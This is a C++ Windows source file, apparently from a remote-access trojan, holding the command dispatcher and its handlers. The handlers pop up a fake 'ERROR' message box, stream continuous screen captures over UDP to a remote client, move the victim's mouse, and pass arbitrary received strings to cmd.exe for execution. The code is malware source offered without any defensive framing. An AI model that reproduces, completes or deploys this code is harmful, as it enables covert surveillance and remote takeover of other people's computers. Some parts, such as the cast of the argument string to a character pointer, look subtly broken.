#include "..\pch.h"

#include "Commands.hpp"
#include "..\Network\UDPConnection.hpp"
#include "ScreenCapturer.hpp"
#include "..\Debugger.h"

std::string ExecuteCommand(INT code, std::string &args)
{
	$I(TEXT("cmd:'%d', args:'%s'\n"), code, args.c_str());

	static std::string result(RESULT_LENGTH, { }); 
	for (size_t i = 0; i < NUMBER_OF_COMMANDS; ++i)
		if (MAP_COMMANDS[i].pair.code == code)
		{
			MAP_COMMANDS[i].task(&args, result);

			return result;
		}

	return UNDEFINEDA;
}

VOID _on_task_MESSAGEBOX(CONST PVOID args, std::string &result)
{
	if (!MessageBoxEx(NULL, ((std::string*)args)->c_str(), TEXTH("ERROR"), MB_ICONERROR, MAKELANGID(LANG_NEUTRAL, SUBLANG_NEUTRAL)))
		result = TASK_FAILUREA;
	else
		result = TASK_SUCCESSA;
}

VOID SendDesktopScreen()
{
	static DirectXParametrs dxp;
	static UDPClient udpclient;
	static BOOL init = FALSE;

	if (!init)
		init = udpclient.init();
	while (TRUE)
	{
		LPBYTE shot = CaptureScreen(&dxp);

		udpclient.send(std::string(reinterpret_cast<char*>(shot)));

		if(shot)
			delete[] shot;
	}
}

VOID _on_task_VIEWDESKTOP(CONST PVOID args, std::string &result)
{
	static HANDLE hThread = NULL;

	int x = 0;
	if (_stscanf_s(reinterpret_cast<std::string*>(args)->c_str(), TEXT("%d"), &x) == 0) // No args == start or work(if started)
	{
		if (!hThread)
		{
			hThread = CreateThread(NULL, 0, reinterpret_cast<LPTHREAD_START_ROUTINE>(&SendDesktopScreen), 0, 0, NULL);
			if(!hThread)
				result = TASK_FAILUREA;
			else
				result = TASK_SUCCESSA;
		}
		else
			result = TASK_SUCCESSA;
	}
	else
	{
		if(!CloseHandle(hThread))
			result = TASK_FAILUREA;
		else
			result = TASK_SUCCESSA;

		if (closesocket(socket) != 0)
			PrintError(TEXTH("closesocket"), WSAGetLastError());

		socket = INVALID_SOCKET;
	}
}

VOID _on_task_MOUSECTRL(CONST PVOID args, std::string &result)
{
	INT x = 0,
		y = 0;

	std::stringstream sstr(*reinterpret_cast<std::string*>(args));
	sstr >> x >> y;

	if (!SetCursorPos(x, y))
	{
		PrintError(TEXTH("SetCursorPos"), GetLastError());

		result = TASK_FAILUREA;
	}
	else
		result = TASK_SUCCESSA;
}

VOID _on_task_EXECUTECMD(CONST PVOID args, std::string &result)
{
	SHELLEXECUTEINFO shell = { sizeof(SHELLEXECUTEINFO) };
	shell.fMask            = SEE_MASK_DEFAULT;
	shell.lpVerb           = TEXT("open"); // Yep, i know that it is a default value
	shell.lpFile           = TEXT("cmd.exe");
	shell.lpParameters     = static_cast<PTCHAR>(args);
	shell.nShow            = SW_SHOW;
	if (!ShellExecuteEx(&shell))
		result = TASK_FAILUREA;
	else
		result = TASK_SUCCESSA;
}

INT cmd2code(CONST PTCHAR cmd)
{
	for (size_t i = 0ul; i < NUMBER_OF_COMMANDS; ++i)
		if (_tcscmp(MAP_COMMANDS[i].pair.name, cmd) == 0)
			return MAP_COMMANDS[i].pair.code;
	
	return UNDEFINEDCMD;
}

CONST PTCHAR code2cmd(INT code)
{ 
	for (size_t i = 0ul; i < NUMBER_OF_COMMANDS; ++i)
		if (MAP_COMMANDS[i].pair.code == code)
			return MAP_COMMANDS[i].pair.name;

	return UNDEFINEDP;
}